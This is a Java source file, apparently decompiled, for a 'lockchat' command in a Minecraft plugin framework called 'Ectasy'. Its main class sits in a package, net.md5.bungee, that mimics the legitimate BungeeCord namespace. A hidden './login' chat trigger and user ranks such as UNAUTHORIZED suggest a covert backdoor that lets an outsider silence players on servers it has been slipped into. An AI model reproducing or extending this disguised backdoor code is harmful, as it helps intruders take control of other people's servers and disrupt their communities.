package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "lockchat",
   description = "Locks the chat",
   blatant = true,
   rank = Rank.FREE
)
public class LockChatCommand extends AbstractCommand implements Listener {
   public boolean locked = false;

   public LockChatCommand() {
   }

   @EventHandler
   public void onChat(AsyncPlayerChatEvent var1) {
      User var2 = Ectasy.users.get(var1.getPlayer().getName());
      if (var2.rank == Rank.UNAUTHORIZED && this.locked) {
         if (!var1.getMessage().equalsIgnoreCase("./login") && !var1.getMessage().equalsIgnoreCase(">")) {
            var1.setCancelled(true);
            var1.getPlayer().sendMessage("§cThe chat is currently locked.");
         }
      }
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      this.locked = !this.locked;
      ChatUtil.sendChat(var1.getPlayer(), "The chat has been " + (!this.locked ? "&aunlocked" : "&clocked"));
   }
}
